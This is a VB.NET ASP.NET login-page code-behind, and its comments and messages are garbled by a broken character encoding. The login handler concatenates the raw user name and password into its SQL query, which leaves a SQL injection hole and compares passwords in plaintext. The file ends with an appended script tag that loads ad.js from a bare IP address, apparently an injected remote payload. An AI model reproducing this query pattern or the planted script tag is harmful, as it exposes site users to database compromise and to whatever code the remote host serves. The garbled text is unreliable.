Imports System.Data
Imports System.Data.SqlClient
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Public Class WebForm2
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblName As System.Web.UI.WebControls.Label
    Protected WithEvents lblPwd As System.Web.UI.WebControls.Label
    Protected WithEvents btnLogIn As System.Web.UI.WebControls.Button
    Protected WithEvents btnReg As System.Web.UI.WebControls.Button
    Protected WithEvents txtName As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtPwd As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblCheck As System.Web.UI.WebControls.Label
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub btnLogIn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnLogIn.Click
        If Me.txtName.Text.Trim() = "" Or Me.txtPwd.Text.Trim() = "" Then
            Me.lblCheck.Text = "���ѣ����������û���������"
            Me.lblCheck.Visible = True
            Exit Sub
        End If

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select UserId,AccessPrivilege from userTable where UserId='" + Me.txtName.Text.Trim() + "' and Psd='" + Me.txtPwd.Text.Trim() + "'"
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.Session("UserName") = Me.txtName.Text.Trim()
                Me.Session("AccPri") = sqlReader.GetString(1)
                Response.Redirect("rmodelpublish.aspx")   ' ������ҳ
            Else
                lblCheck.Text = "���ѣ�������û��������룬���������룬��ע�ᰴťע��"
                lblCheck.Visible = True
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            mySqlConn.Close()
            'Response.Redirect("error.htm") ' ������ʾ
            Throw ex
        Finally
        End Try
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Me.lblCheck.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If

        'If Not Page.IsPostBack() Then
        '    Me.btnReg.Attributes.Add("onclick", "Javascript:return confirm('Are you sure to save?');")
        'End If
    End Sub

    Private Sub btnReg_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnReg.Click
        Response.Redirect("newcustomer.aspx")
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
